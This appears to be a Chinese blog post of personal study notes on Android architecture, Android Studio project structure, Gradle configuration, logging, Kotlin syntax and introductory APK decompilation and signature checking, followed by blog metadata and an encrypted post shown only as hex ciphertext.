层是指使用 C 和 C++ 语言编写的代码，通常被称为本地层。在 Android 应用程序中，本地层主要用于访问底层系统资源，例如文件系统、网络协议栈和硬件接口等。本地层还可以提供与 Java 代码的互操作性，使得 Android 应用程序能够充分利用本地代码的优势，例如高效的内存管理和快速的算法执行速度。 原生库的功能和作用 原生 C&#x2F;C++库为 Android 系统和应用程序提供以下几个方面的支持： 图形处理和渲染：提供图形和用户界面处理库，用于渲染 2D&#x2F;3D 图形。 多媒体支持：支持音频、视频的播放、录制及处理，为媒体相关的应用提供基础支持。 数据存储和访问：提供数据库访问、文件系统管理和存储支持，常用于持久化数据存储。 网络通信：支持应用的网络功能，例如 HTTP 通信、Socket 通信等，保障应用能够实现网络交互。 计算和算法：提供数学计算和加密算法的实现，确保应用在加密、解密、数据分析等方面的需求。 系统运行库层（Android Runtime）通过一些 C&#x2F;C++库为 Android 系统提供了主要的特性支持。包含两部分，一个是系统库，另一个是 ART 虚拟机。 ART 虚拟机ART（Android Runtime）是 Android 操作系统的应用运行时环境，是 Android 应用执行的基础。ART 从 Android 5.0 开始正式替代了早期的 Dalvik 虚拟机，成为 Android 默认的应用运行时。 ART 虚拟机在设计上具有以下几个核心特性： 提前编译（Ahead-of-Time, AOT）：ART 在应用安装时将应用代码从字节码（Java 字节码）编译为本地机器码，从而避免了运行时的编译开销。当用户打开一个应用程序时，ART 会在后台使用 AOT 编译器将应用程序的 Dex 字节码转换成本地机器代码，并存储在设备的存储空间中。这样，在下次打开应用程序时，就可以直接加载已经编译好的代码，避免了解释执行的过程，从而提高了应用程序的运行速度和响应时间。 即时编译（Just-in-Time, JIT）：ART 在后续版本中引入了 JIT 编译，用于动态优化应用性能。在应用运行时，如果检测到一些代码片段频繁被执行，ART 会对这些热点代码进行 JIT 编译，从而进一步优化其执行效率。 高效的垃圾回收（Garbage Collection, GC）：ART 采用并发垃圾回收机制，减少应用卡顿现象。 改进的内存管理：ART 具有高效的内存分配机制，能够减少内存碎片化，提升内存利用率。 调试和诊断支持：ART 提供了更多调试工具和性能分析支持，帮助开发者更好地优化应用。 应用框架层（Java API 框架）提供了构建应用程序时可能用到的各种 API，Android 自带的一些核心应用就是 使用这些 API 完成的，开发者可以使用这些 API 来构建自己的应用程序。 应用层所有安装在手机上的应用程序都是属于这一层的。 文件系统分析概括 gradle 和.idea 这两个目录下放置的都是 Android Studio 自动生成的一些文件，我们无须关心，也不要去 手动编辑。 app 项目中的代码、资源等内容都是放置在这个目录下的，我们后面的开发工作也基本是在这 个目录下进行的，待会儿还会对这个目录单独展开讲解。 build 这个目录主要包含了一些在编译时自动生成的文件，你也不需要过多关心。 gradle 这个目录下包含了 gradle wrapper 的配置文件，使用 gradle wrapper 的方式不需要提前 将 gradle 下载好，而是会自动根据本地的缓存情况决定是否需要联网下载 gradle。 Android Studio 默认就是启用 gradle wrapper 方式的，如果需要更改成离线模式，可以 点击 Android Studio 导航栏 →File→Settings→Build, Execution, Deployment→Gradle，进行配置更改。 .gitignore 这个文件是用来将指定的目录或文件排除在版本控制之外的。关于版本控制，我们将在第 6 章中开始正式的学习。 build.gradle 这是项目全局的 gradle 构建脚本，通常这个文件中的内容是不需要修改的。稍后我们将会 详细分析 gradle 构建脚本中的具体内容。 gradle.properties 这个文件是全局的 gradle 配置文件，在这里配置的属性将会影响到项目中所有的 gradle 编 译脚本。 gradlew 和 gradlew.bat 这两个文件是用来在命令行界面中执行 gradle 命令的，其中 gradlew 是在 Linux 或 Mac 系统 中使用的，gradlew.bat 是在 Windows 系统中使用的。 iml 文件是所有 IntelliJ IDEA 项目都会自动生成的一个文件（Android Studio 是基于 IntelliJ IDEA 开发的），用于标识这是一个 IntelliJ IDEA 项目，我们不需要修改这个文件中的任何内容。 （老版本） local.properties 这个文件用于指定本机中的 Android SDK 路径，通常内容是自动生成的，我们并不需要修 改。除非你本机中的 Android SDK 位置发生了变化，那么就将这个文件中的路径改成新的位置即可。 settings.gradle 这个文件用于指定项目中所有引入的模块。由于 HelloWorld 项目中只有一个 app 模块，因 此该文件中也就只引入了 app 这一个模块。通常情况下，模块的引入是自动完成的，需要我 们手动修改这个文件的场景可能比较少。 app 目录下的结构 build 这个目录和外层的 build 目录类似，也包含了一些在编译时自动生成的文件，不过它里面的 内容会更加复杂，我们不需要过多关心。 （老版本） libs 如果你的项目中使用到了第三方 jar 包，就需要把这些 jar 包都放在 libs 目录下，放在这个目 录下的 jar 包会被自动添加到项目的构建路径里。 （老版本） androidTest 此处是用来编写 Android Test 测试用例的，可以对项目进行一些自动化测试。 java 毫无疑问，java 目录是放置我们所有 Java 代码的地方（Kotlin 代码也放在这里），展开该目录，你将看到系统帮我们自动生成了一个 MainActivity 文件。 res 这个目录下的内容就有点多了。简单点说，就是你在项目中使用到的所有图片、布局、字符串等资源都要存放在这个目录下。当然这个目录下还有很多子目录，图片放在 drawable 目录下，布局放在 layout 目录下，字符串放在 values 目录下，所以你不用担心会把整个 res 目录弄得乱糟糟的。 AndroidManifest.xml 这是整个 Android 项目的配置文件，你在程序中定义的所有四大组件都需要在这个文件里注册，另外还可以在这个文件中给应用程序添加权限声明。由于这个文件以后会经常用到， 我们等用到的时候再做详细说明。 test 此处是用来编写 Unit Test 测试用例的，是对项目进行自动化测试的另一种方式。 .gitignore 这个文件用于将 app 模块内指定的目录或文件排除在版本控制之外，作用和外层 的.gitignore 文件类似。 app.iml IntelliJ IDEA 项目自动生成的文件，我们不需要关心或修改这个文件中的内容。（老版本） build.gradle 这是 app 模块的 gradle 构建脚本，这个文件中会指定很多项目构建相关的配置，我们稍后 将会详细分析 gradle 构建脚本中的具体内容。 proguard-rules.pro 这个文件用于指定项目代码的混淆规则，当代码开发完成后打包成安装包文件，如果不希 望代码被别人破解，通常会将代码进行混淆，从而让破解者难以阅读。 资源目录 drawable 目录 用于存放应用的图像资源，包括位图（PNG、JPG）、矢量图（SVG、Vector Drawable）、图形 XML 文件等。 layout 目录 用于存放 XML 布局文件，用来定义应用界面的布局结构。 mipmap 目录 主要用于存放应用启动图标（ic_launcher）的不同分辨率图标资源。 values 目录 用于存放各种类型的资源值文件，通常包含以下几种文件： **values/strings.xml**：存放应用中使用的字符串资源。 **values/colors.xml**：存放颜色资源。 **values/dimens.xml**：存放尺寸资源，如布局中的间距、字体大小等。 **values/styles.xml**：存放样式资源，定义应用主题、样式属性等。 **values/attrs.xml**：存放自定义属性。 xml 目录 用于存放 XML 配置文件，常见的有自定义的静态配置数据、布局约束文件等。 字符串在哪里—以 Helloworld 为例首先打开 AndroidManifest.xml 文件，从中可以找到如下代码 1234567891011&lt;activity android:name=&quot;.MainActivity&quot; android:exported=&quot;true&quot; android:label=&quot;@string/app_name&quot; android:theme=&quot;@style/Theme.Helloworld&quot;&gt; &lt;intent-filter&gt; &lt;action android:name=&quot;android.intent.action.MAIN&quot; /&gt; &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot; /&gt; &lt;/intent-filter&gt; &lt;/activity&gt; 这段代码表示对 MainActivity 进行注册，没有在 AndroidManifest.xml 里注册的 Activity 是不能使用的。其中 intent-filter 里的两行代码非常重要，和表示 MainActivity 是这个项目的主 Activity，在手机上点击应用图标，首先启动的就是这个 Activity。Activity 是 Android 应用程序的门面，凡是在应用中你看得到的东西，都是放在 Activity 中的。 打开 MainActivity，代码如下所示 12345678910111213141516class MainActivity : ComponentActivity() &#123; override fun onCreate(savedInstanceState: Bundle?) &#123; super.onCreate(savedInstanceState) enableEdgeToEdge() setContent &#123; HelloworldTheme &#123; Scaffold(modifier = Modifier.fillMaxSize()) &#123; innerPadding -&gt; Greeting( name = &quot;Android&quot;, modifier = Modifier.padding(innerPadding) ) &#125; &#125; &#125; &#125;&#125; 首先可以看到，MainActivity 是继承自 ComponentActivity 的。ComponentActivity 是 AndroidX 中提供的一种向下兼容的 Activity，可以使 Activity 在不同系统版本中的功能保持一致性。而 Activity 类是 Android 系统提供的一个基类，我们项目中所有自定义的 Activity 都必须继承它或者它的子类才能拥有 Activity 的特性（ComponentActivity 是 Activity 的子类）。然后可以看到 MainActivity 中有一个 onCreate()方法，这个方法是一个 Activity 被创建时必定要 执行的方法，并且没有“HelloWorld”的字样。 “HelloWorld”是在哪里定义的呢？其实 Android 程序的设计讲究逻辑和视图分离，因此是不推荐在 Activity 中直接编写界面的。一种更加通用的做法是，在布局文件中编写界面，然后在 Activity 中引入进来。 res 目录中的内容就变得非常简单了。所有 以“drawable”开头的目录都是用来放图片的，所有以“mipmap”开头的目录都是用来放应用图标的，所有以“values”开头的目录都是用来放字符串、样式、颜色等配置的，所有 以“layout”开头的目录都是用来放布局文件的。 打开 res&#x2F;values&#x2F;strings.xml 文件，内容如下所示 123&lt;resources&gt; &lt;string name=&quot;app_name&quot;&gt;Helloworld&lt;/string&gt;&lt;/resources&gt; 可以看到，这里定义了一个应用程序名的字符串，我们有以下两种方式来引用它。 在代码中通过 R.string.app_name 可以获得该字符串的引用。 在 XML 中通过@string&#x2F;app_name 可以获得该字符串的引用。 基本的语法就是上面这两种方式，其中 string 部分是可以替换的，如果是引用的图片资源就可 以替换成 drawable，如果是引用的应用图标就可以替换成 mipmap，如果是引用的布局文件就 可以替换成 layout，以此类推。 build.gradle 文件不同于 Eclipse，Android Studio 是采用 Gradle 来构建项目的。Gradle 是一个非常先进的项目 构建工具，它使用了一种基于 Groovy 的领域特定语言（DSL）来进行项目设置，摒弃了传统基 于 XML（如 Ant 和 Maven）的各种烦琐配置。 DSL 的全称是 Domain Specific Language 即 领域特定语言，我们可以通过 DSL 语言 构建出属于我们自己的语法结构，而在 Kotlin 中并不只有一种方式实现 DSL，而主要的实现方式就是高阶函数 12345678910111213141516171819202122232425262728293031323334353637383940414243444546plugins &#123; id &#x27;com.android.application&#x27;//声明了使用的Gradle插件 &#125;//一般有两种值可选：com.android.application表示这是一个应用程序模块，com.android.library 表示这是一个库模块。应用程序模块和库模块的最大区别在于，一个是可以直接运行的，一个只能作为代码库依附于别的应用程序模块来运行android &#123; namespace &#x27;com.example.the_first_demo&#x27;//指定应用程序的命名空间，也就是应用程序的包名 compileSdk 33//指定编译使用的API级别，sdk版本 defaultConfig &#123; applicationId &quot;com.example.the_first_demo&quot; //应用程序ID minSdk 16 //最低支持的Android版本 targetSdk 33//指定的值表示你在该目标版本上已经做过了充分的测试，会启用该版本的新特性(目标版本) versionCode 1 //版本代码 versionName &quot;1.0&quot;//版本名称​ testInstrumentationRunner &quot;androidx.test.runner.AndroidJUnitRunner&quot; &#125; buildTypes &#123; release &#123; minifyEnabled false //指定是否对项目的代码进行混淆，true 表示混淆，false 表示不混淆 proguardFiles getDefaultProguardFile(&#x27;proguard-android-optimize.txt&#x27;), &#x27;proguard-rules.pro&#x27; // proguardFiles 用于指定混淆时使用的规则文件，这里指定了两个文件 // 第一个proguard-android-optimize.txt 是在Android SDK目录下的，里面是所有项目通用的混淆规则； // 第二个proguard-rules.pro 是在当前项目的根目录下的，里面可以编写当前项目特有的混淆规则​ &#125; &#125; compileOptions &#123;​ sourceCompatibility JavaVersion.VERSION_1_8 //指定编译使用的Java版本​ targetCompatibility JavaVersion.VERSION_1_8 &#125;&#125;dependencies &#123; //声明了应用所依赖的库 //指定应用程序运行时需要的库 implementation &#x27;androidx.appcompat:appcompat:1.4.1&#x27;//是支持应用程序兼容旧版本Android的库 implementation &#x27;com.google.android.material:material:1.5.0&#x27;//是Material Design组件库 implementation &#x27;androidx.constraintlayout:constraintlayout:2.1.3&#x27;//是一个用于布局的库 //指定单元测试时需要的库 testImplementation &#x27;junit:junit:4.13.2&#x27;//JUnit单元测试库 //指定Android测试时需要的库 androidTestImplementation &#x27;androidx.test.ext:junit:1.1.3&#x27;//JUnit扩展库 androidTestImplementation &#x27;androidx.test.espresso:espresso-core:3.4.0&#x27;//Android UI测试的Espresso库&#125; 日志ndroid 中的日志工具类是 Log（android.util.Log），这个类中提供了如下 5 个方法来供我 们打印日志。 Log.v()。用于打印那些最为琐碎的、意义最小的日志信息。对应级别 verbose，是 Android 日志里面级别最低的一种。 Log.d()。用于打印一些调试信息，这些信息对你调试程序和分析问题应该是有帮助的。 对应级别 debug，比 verbose 高一级。 Log.i()。用于打印一些比较重要的数据，这些数据应该是你非常想看到的、可以帮你分 析用户行为的数据。对应级别 info，比 debug 高一级。 Log.w()。用于打印一些警告信息，提示程序在这个地方可能会有潜在的风险，最好去修 复一下这些出现警告的地方。对应级别 warn，比 info 高一级。 Log.e()。用于打印程序中的错误信息，比如程序进入了 catch 语句中。当有错误信息打 印出来的时候，一般代表你的程序出现严重问题了，必须尽快修复。对应级别 error，比 warn 高一级。 四大组件活动(Activity)：在应用中能看到的东西都是放在活动中。 服务(Service)：无法看到，它会一直在后台运行，即使用户退出了应用，服务可以继续运行。 广播接收器(Broadcast Receiver)：允许应用接受来自各处的广播信息，比如电话、短信等。 内容提供器(Content Provider)：为应用程序之间共享数据提供了可能，比如读取系统电话簿中的联系人。 虚拟机关于 Dalvik 虚拟机 - 简书 (jianshu.com) DX 工具用来转换 Java class 称为 dex 格式，但不是全部。多个类型包含在一个 Dex 文件中，多个类型中重复的字符串和其他常数在 Dex 中只存放一次，以节省空间。Java 字节码转换成 DVM 所使用的替代指令集。一个未压缩 Dex 文件通常是稍稍小于一个已经压缩的 jar 文件。 kotlin变量： Kotlin 中定义一个变量，只允许在变量前声明两种关键字：val 和 var。它拥有出色的类型推导机制。 val（value 的简写）用来声明一个不可变的变量，这种变量在初始赋值之后就再也不能重新赋 值，对应 Java 中的 final 变量。 var（variable 的简写）用来声明一个可变的变量，这种变量在初始赋值之后仍然可以再被重新 赋值，对应 Java 中的非 final 变量。 也可以显式地声明了变量 a 为特定类型，此时 Kotlin 就不会再尝试进行类型推导了 如： 1val a: Int = 10 函数： 123fun methodName(param1: Int, param2: Int): Int &#123; return 0 &#125; fun（function 的简写）是定义函数的关键字 函数名后面紧跟着一对括号，里面可以声明该函数接收什么参数，参数的数量可以是任意多个，例如上述示例就表示该函数接收两个 Int 类型的参数。参数的声明格式是“参数名: 参数类型”，其中参数名也是可以随便定义的，这一点和函数名类似。如果不想接收任何参数，那么写一对空括号就可以了。 参数括号后面的那部分是可选的，用于声明该函数会返回什么类型的数据，上述示例就表示该 函数会返回一个 Int 类型的数据。如果你的函数不需要返回任何数据，这部分可以直接不写。 语句： Kotlin 中的条件语句主要有两种实现方式：if 和 when。 首先学习 if，Kotlin 中的 if 语句和 Java 中的 if 语句几乎没有任何区别，但是 Kotlin 中的 if 语句相比于 Java 有一个额外的功能，它是可以有返回值的，返回值就是 if 语句每 一个条件中最后一行代码的返回值。 12345678fun largerNumber(num1: Int, num2: Int): Int &#123; val value = if (num1 &gt; num2) &#123; num1 &#125; else &#123; num2 &#125; return value &#125; when 语句和 if 语句一样， 也是可以有返回值的 1234567fun getScore(name: String) = when (name) &#123; &quot;Tom&quot; -&gt; 86 &quot;Jim&quot; -&gt; 77 &quot;Jack&quot; -&gt; 95 &quot;Lily&quot; -&gt; 100 else -&gt; 0 &#125; when 语句允许传入一个任意类型的参数，然后可以在 when 的结构体中定义一系列的条件，格式 是： 1匹配值 -&gt; &#123; 执行逻辑 &#125; 除了精确匹配之外，when 语句还允许进行类型匹配 1234567fun checkNumber(num: Number) &#123; when (num) &#123; is Int -&gt; println(&quot;number is Int&quot;) is Double -&gt; println(&quot;number is Double&quot;) else -&gt; println(&quot;number not support&quot;) &#125; &#125; for-in 循环 12345fun main() &#123; for (i in 0..10) &#123; println(i) &#125; &#125; Kotlin 中可以使用 until 关键字来创建一个左闭右开的区间，如 下所示： 1val range = 0 until 10 数学表达方式是[0, 10) 而如果你想跳过其中的一些元素，可以使用 step 关键字 12345fun main() &#123; for (i in 0 until 10 step 2) &#123; println(i) &#125; &#125; 相当于 for-i 循环中 i &#x3D; i + 2 的效果 如果你想创建一个降序的区间，可以使用 downTo 关键字 12345fun main() &#123; for (i in 10 downTo 1) &#123; println(i) &#125; &#125; Android 逆向分析初探：APK 反编译之一：基础知识_apk 反编译基础-CSDN 博客 APK 文件其实是 zip 格式，后缀名被修改为 apk，可以用解压软件打开，结构如下: AndroidManifest.xml 是程序全局配置文件，描述应用的名字、版本、权限、引用的库文件等信息。apk 中的 AndroidManifest.xml 是经过压缩的，可以通过 AXMLPrinter2 工具解开，命令为：java -jar AXMLPrinter2.jar AndroidManifest.xml。 classes.dex 是 java 源码编译后生成的 dalvik 字节码文件。其中包含 APK 的可执行代码，反编译 apk 时，反编译的其实就是 dex 文件。 resources.arsc 是编译后的二进制资源文件的索引。 res 目录存放资源文件，包括图片，字符串等。 libs 目录存放程序中用到的 so 库，即动态链接库。 META-INF 目录下存放的是签名信息，用来保证 apk 包的完整性和系统的安全 assets 目录用于存放需要打包到应用程序的静态文件。 Activity：Activity 表示应用的一个屏幕，用于呈现给用户，并可接受处理与用户交互产生的界面事件。 Android 系统中以栈的形式保存所有 Activity。当一个新的 Activity 启动时，该 Activity 就会被压入 Activity 栈顶。当用 户按下 Back 返回按钮，当前 Activity 就会被关闭，栈中下一个 Activity 就会被移到栈顶，变成活跃状态。Activity 有 4 种状态： 活动状态。Activity 处于栈顶，可见的、具有焦点，可接受用户交互。系统会优先保持其所需资源，使其处于可见状态。 暂停状态。某些状态下，Activity 处于可见状态，但是没有获得焦点，不能与用户交互，此时处于暂停状态，比如长按 Home 键，当前应用就会变为暂停状态。在极端状况下，系统会终止处于暂停状态的 Activity，释放资源。 停止状态。当一个 Activity 完全不可见时，它就会变为停止状态。此时内存中还会保留相关信息。 Android 内存管理会优先释放处于非活动状态 Activity 的资源，接着释放处于停止状态的资源，只有在极端状况下，才会释放处于暂停状态 Activity 的资源。 当启动一个 Activity 时，会依次执行 onCreate、onStart、onResume 方法，当 Activity 重新获得焦点时，会依次执行 onRestart、onStart、onResume 方法，当关闭 Activity 时，会依次执行 onPause、onStop、onDestroy 方 法 了解 smali 结构 使用 Apktool 反编译 apk 后，会在反编译目录下生成一个 smali 文件夹，里面存放着的就是所有反编译出的 smali 文件，这些文件会根据程序包的层次结构生成相应的目录，程序中所有的类都会在相应的目录下生成独立的 smali 文件。baksmali 在反编译文件时，会为每个类单独生成了一个 smali 文件，内部类作为一个独立的类，它也拥有自己独立的 smali 文件，其文件名以“外部类名$内部类名”的形式定义。 签名检查的原理 每一个软件在发布时都需要开发人员对其进行签名，而签名使用的密钥文件是开发人员所独有的。破解者通常无法拿到开发人员的签名密钥，因此，签名是 Android 软件中一种有效的身份标识。如果软件运行过程中发现签名和自身发布时的不一致，很有可能是被篡改过，就可以中止软件的运行。Android SDK 中提供了检测软件签名的方法，可以调用 PackageManager 类的 getPackageInfo()方法，为第二个参数传入 PckageManager.GET_SIGNATURES，返回的 PackageInfo()对象中的 signatures 字段就是软件发布时的签名。但是，这个签名内容较长，不适合在代码中做比较判断，所以可以计算签名的哈希值并以它来做比较。哈希值相同，可以认为签名相同。 杂记所谓原生，就是离 libart.so 更近：安卓原生就是 libart.so 来解释。Linux 原生就是 CPU 来直接解释。 pengxurui&#x2F;AndroidFamily: 🔥【Android 面经 + Android 学习指南】一份帮助 Android 开发者知识积累与能力进阶的学习路线","categories":[{"name":"andriod security","slug":"andriod-security","permalink":"http://example.com/categories/andriod-security/"}],"tags":[],"keywords":[{"name":"andriod security","slug":"andriod-security","permalink":"http://example.com/categories/andriod-security/"}]},{"title":"信息系统安全","slug":"信息系统安全","date":"2022-11-25T12:39:50.000Z","updated":"2022-11-29T13:49:07.078Z","comments":true,"path":"2022/11/25/信息系统安全/","link":"","permalink":"http://example.com/2022/11/25/%E4%BF%A1%E6%81%AF%E7%B3%BB%E7%BB%9F%E5%AE%89%E5%85%A8/","excerpt":"有东西被加密了, 请输入密码查看.","text":"017c4e8f7610c1b9fb10a2c0cb262ea921f677162e357764dfab80e3359967677e15df1ba1f65ed5edb15fd58a2e69a10bfc4197c5163691b987f4446ec0dcf765f0f431d5ca5693b6e4c94f0657b5c6ce35b81bb4e7b19935ef77b257ad3018315939470bae8a8a3bd5263ad826982b43fb46681e2cceb4603911dc019a7d35769eedab1659397efb941ea4314923bbcf8a62881e900e493d2df2fb3b9f2754a37cb8261b6d5bf25bb123355b9cc719b328119cdc0f36c98a978b806b3c41517542cf4c24e569d3e79cde8e69537d8c196f7d3226277e0cd5423550f7cc222c92bef8c2ae64c1eff7b57215742c6eb51997a3d7a9c6bd62c5a3a2969d32f58754e710a4a25f76a3f95c367c1f6773d9eaef7ce0a3d9c75e66d5f64f2d1d1fcf67c902e5c49b348498d5ebdf90ad38b2a10698f8553e30939c3cd56769cbf26b088f6406c157fba68970b91d935b22d9870682e6d8ef8aa596a4825c55ec6ce05d03a687ebeeddf59b90e212713cfd8774aad66d44fa6bcd1b74ac52d24f6436d8bf27501b184ed0b7f747c9ce30706ff5aeea2ff194ea8988d5bb605c2e662dd99901df0590236a63286c841dafd54be0a1ad6d4e515c995fac562038899380e8fbac863045bbe26ae3e19f489a5d24e62017f9eb0b2aa81257229a566539b52fe839fcc888a67c3e2b5981bdf8a29fe674ab3a08d74689e523133591ed9e263597a575a727975f914111d124ff05abf3e0ca30323ae712260d887e212dbcc7689c1c4cf502f509af2c007ad70dc2ee033ced3620e88ed5b03a7fa64836748de24ff09b5935a50c533d3c5c1f12b037a79dd1433d1ec548cbd02a6711e3eaf6dceee4a2b9163410f9d40497aba5236172e971f6adf60f4f07d84dfab0ded0a46c5a288cc33dc907ffe0287cba1ff4a6d42fd56bcf93f4bd3d04c59c32867c6243634259291d6216e28f7a5c0535e6241ccc2a7559f125a2b8be08170cfd427a43c3279ac619adece0aa0740e5dbd41e8103c081809c72a9302a5a6a4901147117be482a2f442f1a264b334965d275f6e47317ac98c7ba19e4c38f353b39a2d4307bbb61dea34c48daaeb3736e6bb635b44135c25f2cf7886e804c2687b56c6e8a76af59949d6d3e71508d9eea6c2fc55ae9819ac13be01247d61b05795879a78231a4f0cdae4659dcd12b5eb49e79d6eea166ff6e2e23f0ec3556549e16f5e5cacc182b9b9a57d239bdbee7e2b34433cc35a7143c9e4e3def7725d7f7fe84ec28c62309dbb9eff49728e723d924bb7f82ea22f43883893ccd9c72273f26f55f1eb82b60a55bf74a1ae4a26f669cf73b912bf7e07de455a5b37b6c9daf59eb071d49fe9907fd59850cbcadcde2a8f2132d23731202224beaceeabbdbd4d5c3e27876a627918b11b333830c1957408b9b0157a67df13c27043bf611f91ea5a2c7ceaa71feafe4d1a1c1055ca3d4a69f12f00ed447e6c373c2b9f60be8e47b4bc8ce1c97f65704eaaf3faa586cf322b6d1191bfa2f7d249144f4901b725903917d2ac8d2c652e09570aa52246828df5ea0551d91631bf7235177b274063de38dfa1446bb0822edee4eeb7d475280eab2bb372d92af50f826a201c2be2a40e686f7f218d969dce0d8b85d458d361aca0d6e6a0cc67f54fee5fffbb3d5af858adf141b90396b1ec9ca99474c9cfc80bb763bb85681511861020a79e3b851d1e9cb91a18d4d893814b4f45855683218c3066ab79d6248bc13fa3cf5c942b4844dd538381cd6a93d84459ee70e5a825e4bca5862aa7d713754a0d3f228fa8753ca674bc835199318813e4100e25226afc4bb7160eb199181a1914352f287703dbd3e1dfbc01c1f39b62627c715f962b5caf3a6540289089cf8afd24164ab1de1fdf9eb1a297ae1ec083df4cd99667646adb661da9acaf9c4ea428342215358c4aafaa3ab7eca5f17c9aa7f36ee9ab79cc49ac8c4567b9116d72254e78df4fd40f49a3e66310a37e9f0ed1a20b5a637d3c66917f42448e6e44ba4a67121173911999c2f326e55d7a560fad61a8fe1165042485893499027cf54a6a42d8c748789d9680d24dd737faaccc15afe16c61f6225f0a46c3fb5ccb5787430e36e3e5b53b8b4828465450358a36bd0c01dcc53a21bf2152a5b0fcb3de146c6f0c7cc0d19b1e9e609cabc673094de38f1f1c553a8435a6bbfe25d9b77e21375d40ba34832da3449b5b682effe32193431d785f4a7742529f746a97ed9c78cb8baf38b9c85efb48497f4cb8786128d3fc7200d8b72baa5fcd85292ad15b143c99b1aa0e83aa8289b58614ac6d3f77488585d765b689b141c55c5a2e2e1f72b24c17bc7158bd5da5ca1931df52133bd9b0d708d076f76da264797f53590b5a0cdee4fe9fa38dfdcceb5b641106245d22b6342b7a08f31ea46488809e5c50de6a1e8b0bafe53d94bb8f14f1f566001457631bad0b64c0bfc424fdebac37545069a497e5357b31171266bbb40ca3cd635e46407a7ee0ab406b4e2fe51978c9190fc52c11f0c74a0882afe5ab3abf6cd6e13ed0db3981bccbf81bc97a7cd3aeb8b844f1dade035649712cc3fd22aab2560fd658b2d6fbc32f0cac8218f5de53b0ec2900616c5119b58e73c2277ecafae73969079ecd9a99e9a6fa1b8ca04d7669850548402a71a24685dae06f028e478ffb02e8d802519ef4b453b0b7d1aad74fd275cfc809c34af29aa2cc2f4d19b196aeedee80ba91fe22524d9757ee548e190c07693d6fc6725d5377a8c8b9ac342b7992c64b5859d881763abe423c89201b2d07de9b6f7b2b79459a0d946e3af68206566beb59bbd9ee342399eb1159da64d10cd0101f3b8d8c6803bf15a1bd4f922310bbba2a3e5e8c7c37621e95b09a0fa803ed7a28b5c5e59d139e068d572090fc026f8ed65fe5508c436da546255a1c0a72e1baddfcb716e250a9ed539c4de30b663cf1633732f8de4005f1ca52b7186ddbb0eef3678c1033d770ef31e40ac2ddbabfb5267f78e4331b95ca5c83aa99aba514e4437124049ecd249dcc31adea330cb3c3f2ef490a69a33c340ddc351df54069e2281d305086eedb2dd3270acb0ab121dd8a2d560eb93319cfb4df843e00572ca5a4bead705d6fa8e718a9be6bc82ebae52ba1fc78c1176a5109a88417919628bf554d02d854d2a991ed7ade0aa87c066f574e95546b3c439539867a1478d3dd5dda37d73a09a64394bad136c84332c3bc3f26163be6c7d215944f7d97083c027dd21e9a0ad9adf308db434ab843a477af1b971b2eba17c189b8a5e7b1c46e880d7d84de8810d7193f9c79782f4f8af0be0d3212bbec563ea604f247e0ac38918ca49dc882d811f57209f0ebfacef54724e9a9e85d75f111a0fad217e0c3a98414e3cff116582d4006a423b004c51fa55a4bbe910f3b8b726c89619ec964b1ab33cd8d2149afb86afaeb38afc333003f7f62eb94a0cbf09e58c18021a9ba2577fc1147adaaf91c599779d285a26b0c01c4fc992b5b72e5979d31219706c6afc32461bef83a4d40cf01e69187ca8d2f90495b7c87fc594884f43bd3d0d62d1e45d27ea886cc5a64a5c6760f5ad466145c1d0a9e202a45ab4b811acdaf43f111c500d1605434209ffc067a018b84712e01ed7b21f6cef7068da3137b41099b54468aca83fda55f4cca8bd4ccf33a047baca2851f1c7b4b5d7acbc8681df6f18957f36c25df2f11579d2291515e431ae10a36ba8ee00bd1bbe0382ee0ee4fc0f516c097e6471194dc1f2459620cefd1526feb39030f5c197c6752713815ccc089940cafa67b2d11b604af98808840d4b6bc9f6e27088d627dd602e8d87fc6d451f68506d5d6f0a6f4fd9555c6c0377e5b358f8be30c16abfc0884fbdd86254ed7e102034943c2764693a58918e3f294d3843c4d8c425f78e6a1bade41ab4e3cef018cabd245e35ea080b573de84ff35c09694a6dd323fd7d5c253342d0fecd338013d7d8abc16013b1382a81419c28d9eb914e97af60d082289120ece24dbf87d654e1ba8e8028452813c61eefb9324990f849c475ccb4604e3d1823e216310f15c54cf6e7587e2845c563e5d53b80ed09022810fcdf838c7df3fca365313b32ac4af4cd989e0720df7273cdb3cd1d1264f4f00269e7d002994b7d2d9d5047245129a08baadf8414699c81ac3709443098f39a2c8b17e089f54633abe611bf581ab0cef9e58d35db1535e2c61a5db22afa61eb36a2900a5fc793a859b70bfa192496fe01300a5f6b3a3e66bc07fa76e4fd436c45b43899491b09de712121295efdc05cbfb14e591efb391d72e7a16134287efc935eff37c51357c8ed113e141dbbbee7ceb281ff7d89bb654af6990109df974a9032d3de61ab16748fdf65cc81f753378ed2e57a2a69acef3e0788e8de7c4460ae0cfa7852c5decd3a32c250b0bd643705d441515b7814f5b77ff136241d179326a3184b7bde7cd67c4a67c52c8efa71e3df3d1134a4b3acc5b9e86dab6730dbb6c5e8c8b266ca839b3116265ac19ec69abda6c763966bf7600f7066e92fcf313aadca8d82e006c622b5ec57f2b82d1262266aa0286beffc967750ad81a6467784dc50e09cb51ad6b8c7cdf095c6e6b3711763fa79263ccc066ab224687dd42014c774102f7fbc223136fd06cf7f020d625a6940d571cc56e87949baf47de62d4f13cd6daa17dc1a1b723751b97eeb56011844fcda16aac6f476b7d61eba70de73c0b19259f6bda51b7c764d56defb2deb9ee00af39beb05422ab515e85a4bd55bf898a771fad7c4fb1a79d64c1cf1b984d16dfe4621a90bdc26a142ef5d11f5c64085fc9779d8bcc3b9ebfce3e2833ca6d954b6344f6f31defb23747a715c7170ef735198c97bf237c6c957a9c1e14b100dd4dd156b159b1b91967ac019728984de8bde9bc738ea76c6a6297a51fa13a0b800498887e3dfb39466e54f48299378a4ae58b978f5c91e0fe080dad40a8360d8142bea229ba18de929d5225dec630a9c81b1ca0ee00db6dc58c3000495008d5991f7aa831190acf951ecfb1ad107d03e11f5782ab14848dd3eee89f09e08f2f08aecd645bde4b5a39407100b0637ee7af0622d9573182b5f2a32698bd75aef030f85202b98b59c20eb3e7f3d8804bb7c8c2f00bf3f715f7afa8a8401c1ca40b4eef5d1c1d07137011667408c67fbe7ef970ffba125f345d7ae75c3a3d7b0cfeedbc85c9ffa81c33192891a4d98a2f8a14e5b2b34aa6861e938094eddcb042a3ad9e597d48c7d8dba78dc09c93b7aeecaf87882afb4130ec0610a819b453676884796bf47ad8eceddf54e8c5a4fbfc65558da8fccd859e01e7695cf19e536370f5d0c93476a126f4ebbefd12d77bb2102641be5519cdccf54055483cc219ec14da0206dfef72b0920152e7d2695678e1cb8ff85bf054ca12010c9fa769faf137701691b246646ce01621e64b5066e1e176a94a65a3349076c0a554eb64838850a6893f4449f5203e31d6c846